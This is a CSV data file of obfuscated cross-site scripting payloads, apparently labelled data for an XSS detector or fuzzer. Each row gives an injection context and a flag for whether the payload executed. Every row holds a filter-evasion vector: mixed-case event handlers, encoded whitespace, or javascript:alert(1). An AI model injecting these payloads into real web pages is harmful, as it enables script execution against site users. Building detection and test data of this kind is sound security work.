payload,context,exec,combined
<hTMl/+/ONMOUSEOver+=+(prompt)``//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTMl/+/ONMOUSEOver+=+(prompt)``//
<d3v/+/oNMOUSEoVer%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v/+/oNMOUSEoVer%0d=%0d(confirm)()%0dx>v3dm0s
<d3V/+/OnpOiNteRENter%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V/+/OnpOiNteRENter%09=%09(confirm)()%0dx>v3dm0s
<a/+/onMouseoVER%0a=%0aconfirm()>v3dm0s,url_href,0,CTX_url_href CTX_url_href CTX_url_href <a/+/onMouseoVER%0a=%0aconfirm()>v3dm0s
<a/+/oNpOINTerenTER%0a=%0aconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a/+/oNpOINTerenTER%0a=%0aconfirm()>v3dm0s
"<A%0donmoUSeOVER%0a=%0aa=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <A%0donmoUSeOVER%0a=%0aa=prompt,a()>v3dm0s"
<DETaIlS%0aOnToggLe%09=%09[8].find(confirm)%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DETaIlS%0aOnToggLe%09=%09[8].find(confirm)%0dx//
<A%09onmOUSEOver+=+confirm()%0dx>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <A%09onmOUSEOver+=+confirm()%0dx>v3dm0s
<htmL%09onPOiNTERENTER%09=%09confirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <htmL%09onPOiNTERENTER%09=%09confirm()%0dx//
<a/+/ONPoiNtEREnTEr%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/ONPoiNtEREnTEr%0a=%0a[8].find(confirm)%0dx>v3dm0s
<D3v%0aOnpOInterEnTer%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aOnpOInterEnTer%09=%09(confirm)()%0dx>v3dm0s
<D3V%0aONMOUSeoVEr%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aONMOUSeoVEr%0d=%0d(prompt)``%0dx>v3dm0s
<HtmL%0aonPOiNterentER%0a=%0a(confirm)()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtmL%0aonPOiNterentER%0a=%0a(confirm)()//
<A%0aONMoUseOver+=+[8].find(confirm)%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aONMoUseOver+=+[8].find(confirm)%0dx>v3dm0s
<DeTails%09ONToGGlE%09=%09[8].find(confirm)>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTails%09ONToGGlE%09=%09[8].find(confirm)>
"<a%09onpoinTeReNTer%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <a%09onpoinTeReNTer%09=%09a=prompt,a()%0dx>v3dm0s"
javascript:alert(1),url_href,1,CTX_url_href CTX_url_href CTX_url_href javascript:alert(1)
<D3V%0aonmOuseOVeR%09=%09confirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aonmOuseOVeR%09=%09confirm()%0dx>v3dm0s
<D3V/+/onMoUSEOVER%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V/+/onMoUSEOVER%0d=%0dconfirm()%0dx>v3dm0s
<d3v/+/OnPOIntErEntER%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v/+/OnPOIntErEntER%0a=%0a[8].find(confirm)>v3dm0s
<DeTaILS%0dONpoIntERenter%09=%09(prompt)``%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DeTaILS%0dONpoIntERenter%09=%09(prompt)``%0dx>
<HTML%0aoNpoinTerENTeR+=+(prompt)``//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTML%0aoNpoinTerENTeR+=+(prompt)``//
"<DEtAiLs/+/ONPOINtEREnteR+=+a=prompt,a()%0dx//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <DEtAiLs/+/ONPOINtEREnteR+=+a=prompt,a()%0dx//"
"<Html%09ONmousEoVEr+=+a=prompt,a()>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <Html%09ONmousEoVEr+=+a=prompt,a()>"
<D3V%09ONPOinTErENTER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%09ONPOinTErENTER%0d=%0dconfirm()%0dx>v3dm0s
